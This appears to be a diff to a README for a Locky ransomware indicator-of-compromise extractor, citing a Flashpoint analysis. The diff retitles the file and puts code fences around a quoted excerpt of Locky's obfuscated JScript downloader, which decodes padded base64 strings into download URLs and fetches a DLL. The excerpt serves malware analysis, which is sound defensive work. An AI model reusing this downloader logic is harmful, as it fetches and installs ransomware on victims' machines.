@@ -1,4 +1,4 @@
-# Locky
+# Locky Indicator of Compromise (IOC) JSCRIPT Extractor
 
 Source: **https://www.flashpoint-intel.com/anatomy-locky-zepto-ransomware/**
 
@@ -37,7 +37,7 @@ NqmXYsBdh[.]dll
 
 **Here is the relevant function right below the eval() one:**
 
-var brigadabrigadalalapolicMOTALO2HORDA17 = "NqmXYsBdh";
+```var brigadabrigadalalapolicMOTALO2HORDA17 = "NqmXYsBdh";
 var brigadabrigadalalapolicTRAxKey = brigadabrigadalalapolicMOTALO2fsta("b6vYxEjsTYwJ7mIrZz4WFSGHeaddkwbq");
 var brigadabrigadalalapolicMOTALO2_a5 = ["Z29sZGVubGFkeLICIZAXXdlZGRpbmcuY29tL3ZkRzc2VlVZNzZyam51","dLICIZAX3d3LmptZXRhbGxveXNsbHAuYLICIZAX29tL3ZkRzc2VlVZNzZyam51","bGl2ZXdlYnNvbC5jb20vdmRHLICIZAXNzZWVVk3NnJqbnU="]; 
 var brigadabrigadalalapolicMOTALO2HORDAI = 0;
@@ -47,3 +47,4 @@ try{
 var brigadabrigadalalapolicMOTALO2HORDA6 =brigadabrigadalalapolicMOTALO2_bChosteck.brigadabrigadalalapolicMRADXHO() + brigadabrigadalalapolicMOTALO2_a5[brigadabrigadalalapolicMOTALO2HORDA5].brigadabrigadalalapolicMRADXHO() + "?CHhjpz=zhXHhhwS";
 if(brigadabrigadalalapolicMOTALO2_a2(brigadabrigadalalapolicMOTALO2HORDA6,brigadabrigadalalapolicMOTALO2HORDA17+brigadabrigadalalapolicMOTALO2HORDAI)){
 break;
+```
